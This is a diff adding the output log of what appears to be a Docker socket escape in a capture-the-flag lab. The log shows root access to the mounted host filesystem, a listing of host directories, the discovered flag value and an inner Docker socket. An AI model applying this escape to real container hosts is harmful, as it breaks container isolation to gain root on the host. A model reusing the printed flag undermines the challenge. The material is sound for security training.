@@ -1,0 +1,91 @@
+[*] docker sock escape
+=== docker images ===
+REPOSITORY          TAG       IMAGE ID       CREATED       SIZE
+matryoshka-level1   local     485e908211ec   4 days ago    43.9MB
+alpine              3.20      bf8527eb54c3   3 weeks ago   7.8MB
+=== docker ps -a ===
+CONTAINER ID   IMAGE                     COMMAND                  CREATED          STATUS          PORTS     NAMES
+1311133f5f16   matryoshka-level1:local   "sh -lc 'sleep infin…"   24 minutes ago   Up 24 minutes             level1
+[*] using image: alpine:3.20
+===INSIDE_NEW_LAYER===
+a95a3485f61d
+uid=0(root) gid=0(root) groups=0(root)
+Linux a95a3485f61d 6.17.0-1013-aws #13~24.04.1-Ubuntu SMP Fri Apr 24 21:50:45 UTC 2026 x86_64 Linux
+--- /hostfs root ---
+total 72
+drwxr-xr-x    1 root     root          4096 May  8 19:20 .
+drwxr-xr-x   20 root     root          4096 May  8 19:45 ..
+-rwxr-xr-x    1 root     root             0 May  8 19:20 .dockerenv
+drwxr-xr-x    1 root     root          4096 May  4 14:26 bin
+drwxrwxrwt    1 root     root          4096 May  8 19:20 certs
+drwxr-xr-x    5 root     root           340 May  8 19:20 dev
+drwxr-xr-x    1 root     root          4096 May  8 19:20 etc
+drwxr-xr-x    1 root     root          4096 Jul 25  2024 home
+drwxr-xr-x    1 root     root          4096 May  4 14:26 lib
+drwxr-xr-x    5 root     root          4096 Jul 22  2024 media
+drwxr-xr-x    1 root     root          4096 May  8 19:20 mnt
+drwxr-xr-x    1 root     root          4096 May  8 19:20 opt
+dr-xr-xr-x  217 root     root             0 May  8 19:20 proc
+drwx------    1 root     root          4096 May  8 19:20 root
+drwxr-xr-x    1 root     root          4096 May  8 19:20 run
+drwxr-xr-x    1 root     root          4096 May  4 14:26 sbin
+drwxr-xr-x    2 root     root          4096 Jul 22  2024 srv
+dr-xr-xr-x   13 root     root             0 May  8 19:33 sys
+drwxrwxrwt    2 root     root            40 May  8 19:45 tmp
+drwxr-xr-x    1 root     root          4096 Jul 25  2024 usr
+drwxr-xr-x    1 root     root          4096 Jul 22  2024 var
+--- /hostfs/root ---
+total 12
+drwx------    1 root     root          4096 May  8 19:20 .
+drwxr-xr-x    1 root     root          4096 May  8 19:20 ..
+-r--------    1 root     root            20 May  8 19:20 flag_level2.txt
+--- /hostfs/home ---
+total 12
+drwxr-xr-x    1 root     root          4096 Jul 25  2024 .
+drwxr-xr-x    1 root     root          4096 May  8 19:20 ..
+drwxr-sr-x    2 100      101           4096 Jul 25  2024 dockremap
+--- /hostfs/opt ---
+total 16
+drwxr-xr-x    1 root     root          4096 May  8 19:20 .
+drwxr-xr-x    1 root     root          4096 May  8 19:20 ..
+drwx--x--x    4 root     root          4096 May  8 19:20 containerd
+drwxr-xr-x    1 root     root          4096 May  4 14:26 images
+--- /hostfs/srv ---
+total 8
+drwxr-xr-x    2 root     root          4096 Jul 22  2024 .
+drwxr-xr-x    1 root     root          4096 May  8 19:20 ..
+--- find flag files ---
+/hostfs/opt/images/level1-image.tar
+/hostfs/root/flag_level2.txt
+/hostfs/usr/local/bin/level2-entrypoint.sh
+--- grep THM{} content ---
+THM{RUN@W@Y_S0CK3T}
+--- bash history ---
+--- motd / issue ---
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <https://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+Welcome to Alpine Linux 3.20
+Kernel \r on an \m (\l)
+
+--- common flag paths ---
+--- inner docker.sock (DinD) ---
+srw-rw-rw-    1 root     2375             0 May  8 19:20 /hostfs/run/docker.sock
+[*] inner daemon at /hostfs/run/docker.sock
+--- env of running matryoshka-level1 (this layer1 image) ---
+sh: docker: not found
+--- image labels/env ---
+--- /hostfs cgroup ---
+0::/../a95a3485f61db4ac2c0d0778bed3cbcf5cc07111e0b2f1c4bb4d517a563b8ab2
+--- network ---
+    inet 127.0.0.1/8 scope host lo
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
+===END_NEW_LAYER===
